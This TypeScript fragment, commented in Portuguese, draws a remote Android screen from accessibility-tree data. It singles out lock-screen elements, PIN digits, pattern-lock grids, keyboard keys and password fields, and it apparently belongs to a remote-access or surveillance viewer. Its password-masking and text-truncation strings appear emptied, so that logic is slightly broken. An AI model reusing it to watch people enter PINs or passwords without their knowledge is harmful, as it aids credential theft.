const isKeyboardKey = (node: ScreenReaderNode): boolean => {
  const className = node.class?.toLowerCase() || '';
  const id = node.id?.toLowerCase() || '';
  
  // Propriedade explícita do Android
  if ((node as any).isKeyboardKey === true) return true;
  
  // Detecção por classe/id
  if (className.includes('key') || className.includes('keyboard') ||
      id.includes('key') || id.includes('keyboard')) return true;
  
  // Detecção por tamanho típico de tecla (quando clicável)
  if (node.clickable === true && node.bounds != null) {
    const { w, h } = node.bounds;
    // Tecla típica: entre 50-200px de largura, 50-150px de altura
    if (w >= 30 && w <= 250 && h >= 40 && h <= 180) {
      // Proporção típica de tecla
      const ratio = w / h;
      if (ratio >= 0.5 && ratio <= 3) return true;
    }
  }
  
  return false;
};

// Coleta TODOS os elementos visíveis (não só os com texto)
const collectAllVisibleNodes = (node: ScreenReaderNode, nodes: ScreenReaderNode[]) => {
  if (!node || !node.bounds) return;
  const { x, y, w, h } = node.bounds;
  if (x + w < -100 || y + h < -100) return;
  if (w < 4 || h < 4) return;

  const kids = Array.isArray(node.children) ? node.children : [];
  const txt = (node.text || '').trim() || (node.desc || '').trim();
  const interactive = !!(node.clickable || node.editable || node.password || node.isPinDigit);

  if (kids.length === 0) {
    if (txt || interactive || node.id) nodes.push(node);
  } else if (txt && interactive) {
    const same = kids.some((k: any) => (((k.text || '').trim() || (k.desc || '').trim()) === txt));
    if (!same) nodes.push(node);
  }

  kids.forEach((child: ScreenReaderNode) => collectAllVisibleNodes(child, nodes));
};

// Detecta se é elemento de lockscreen
const isLockScreenElement = (node: ScreenReaderNode): boolean => {
  const className = node.class?.toLowerCase() || '';
  const id = node.id?.toLowerCase() || '';
  return (
    node.isLockScreen === true ||
    node.isLockElement === true ||
    node.isPinDigit === true ||
    node.isPatternLock === true ||
    node.isSwipeUnlock === true ||
    className.includes('keyguard') ||
    className.includes('lockpattern') ||
    className.includes('pinview') ||
    id.includes('keyguard') ||
    id.includes('lock') ||
    id.includes('pin')
  );
};

// Desenha um elemento individual
const drawElement = (
  ctx: CanvasRenderingContext2D,
  node: ScreenReaderNode,
  textScale: number,
  designTheme: 'cyan' | 'matrix' | 'neon-red' | 'purple-glowing',
  opacity: number = 0.7,
  cornerStyle: 'brackets' | 'full-border' | 'dots' | 'none' = 'brackets',
  showCoords: boolean = false
) => {
  if (!node || !node.bounds) return;
  const { x, y, w, h } = node.bounds;
  if (w < 3 || h < 3) return;

  const nodeAny = node as any;
  let text = node.text?.trim() || node.desc?.trim() || '';
  if (!text && nodeAny.extra_text) text = nodeAny.extra_text;
  if (!text && nodeAny.extra_label) text = nodeAny.extra_label;
  if (!text && nodeAny.tooltip) text = nodeAny.tooltip;
  if (!text && nodeAny.stateDesc) text = nodeAny.stateDesc;
  if (text === 'true' || text === 'false') text = '';

  const isInput = isInputField(node);
  const isKey = isKeyboardKey(node) || nodeAny.isKeyboardKey === true;
  const isLock = isLockScreenElement(node);
  const interactive = !!(node.clickable || node.editable || node.password || node.isPinDigit || isInput || isKey);

  if (node.password) {
    const dots = (text.match(/[·*]/g) || []).length;
    text = dots > 0 ? ''.repeat(Math.min(dots, 12)) : '';
  }

  let box = 'rgba(255,255,255,0.05)';
  let border = 'rgba(255,255,255,0.16)';
  let fg = '#e9eef7';
  let bw = 1;

  if (designTheme === 'matrix') { box = 'rgba(0,45,12,0.55)'; border = 'rgba(57,255,20,0.35)'; fg = '#b9ffb2'; }
  else if (designTheme === 'neon-red') { box = 'rgba(48,0,0,0.6)'; border = 'rgba(255,70,70,0.42)'; fg = '#ffd2d2'; }
  else if (designTheme === 'purple-glowing') { box = 'rgba(45,0,40,0.6)'; border = 'rgba(244,114,182,0.42)'; fg = '#ffd8f2'; }

  if (node.password) { box = 'rgba(239,68,68,0.22)'; border = '#ef4444'; fg = '#ffffff'; bw = 2; }
  else if (node.isPinDigit) { box = 'rgba(255,140,0,0.22)'; border = '#ff9500'; fg = '#fff4e6'; bw = 2; }
  else if (isInput) { box = 'rgba(34,197,94,0.18)'; border = '#22c55e'; fg = '#eafff1'; bw = 2; }
  else if (node.clickable || isKey) { box = 'rgba(239,68,68,0.14)'; border = 'rgba(239,68,68,0.8)'; fg = '#ffecec'; bw = 1.5; }
  else if (isLock) { box = 'rgba(239,68,68,0.14)'; border = 'rgba(239,68,68,0.65)'; fg = '#ffecec'; }

  const radius = Math.min(7, w / 5, h / 5);
  const drawBox = interactive || !!text;
  const boxAlpha = Math.min(1, Math.max(0.15, opacity + 0.12));
  if (drawBox) {
    ctx.globalAlpha = boxAlpha;
    ctx.fillStyle = box;
    ctx.beginPath();
    safeRoundRect(ctx, x, y, w, h, radius);
    ctx.fill();
    ctx.globalAlpha = 1;

    ctx.strokeStyle = border;
    ctx.lineWidth = bw;
    if (cornerStyle === 'brackets') {
      const len = Math.max(3, Math.min(8, w / 4, h / 4));
      ctx.beginPath(); ctx.moveTo(x + len, y); ctx.lineTo(x, y); ctx.lineTo(x, y + len); ctx.stroke();
      ctx.beginPath(); ctx.moveTo(x + w - len, y); ctx.lineTo(x + w, y); ctx.lineTo(x + w, y + len); ctx.stroke();
      ctx.beginPath(); ctx.moveTo(x, y + h - len); ctx.lineTo(x, y + h); ctx.lineTo(x + len, y + h); ctx.stroke();
      ctx.beginPath(); ctx.moveTo(x + w - len, y + h); ctx.lineTo(x + w, y + h); ctx.lineTo(x + w, y + h - len); ctx.stroke();
    } else if (cornerStyle === 'full-border') {
      ctx.beginPath(); safeRoundRect(ctx, x, y, w, h, radius); ctx.stroke();
    } else if (cornerStyle === 'dots') {
      ctx.setLineDash([2, 3]); ctx.beginPath(); safeRoundRect(ctx, x, y, w, h, radius); ctx.stroke(); ctx.setLineDash([]);
    }
  }

  if (node.isPatternLock && w > 40 && h > 40) {
    const rows = nodeAny.gridRows || 3;
    const cols = nodeAny.gridCols || 3;
    const rr2 = Math.min(w / (cols * 4), h / (rows * 4));
    ctx.fillStyle = 'rgba(239,68,68,0.9)';
    for (let rr = 0; rr < rows; rr++) {
      for (let cc = 0; cc < cols; cc++) {
        ctx.beginPath();
        ctx.arc(x + (cc + 0.5) * (w / cols), y + (rr + 0.5) * (h / rows), rr2, 0, Math.PI * 2);
        ctx.fill();
      }
    }
  }

  if (text && w > 10 && h > 9) {
    let fs = Math.min(20, Math.max(9, Math.min(h * 0.5, (w - 8) / (text.length * 0.55))));
    if (isKey && text.length <= 2) fs = Math.min(26, h * 0.55);
    fs = Math.round(fs * textScale);
    if (fs >= 8) {
      ctx.font = (interactive ? '700 ' : '500 ') + fs + 'px "Segoe UI", system-ui, sans-serif';
      ctx.fillStyle = fg;
      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';
      const maxW = w - 6;
      let dt = text;
      if (ctx.measureText(dt).width > maxW) {
        while (dt.length > 1 && ctx.measureText(dt + '').width > maxW) dt = dt.slice(0, -1);
        dt = dt + '';
      }
      ctx.fillText(dt, x + w / 2, y + h / 2);
    }
  }

  if (showCoords) {
    ctx.font = '500 9px monospace';
    ctx.fillStyle = 'rgba(255,255,255,0.4)';
    ctx.textAlign = 'left';
    ctx.textBaseline = 'bottom';
    ctx.fillText(Math.round(x) + ',' + Math.round(y) + ' ' + Math.round(w) + 'x' + Math.round(h), x + 2, y + h - 1);
  }
};



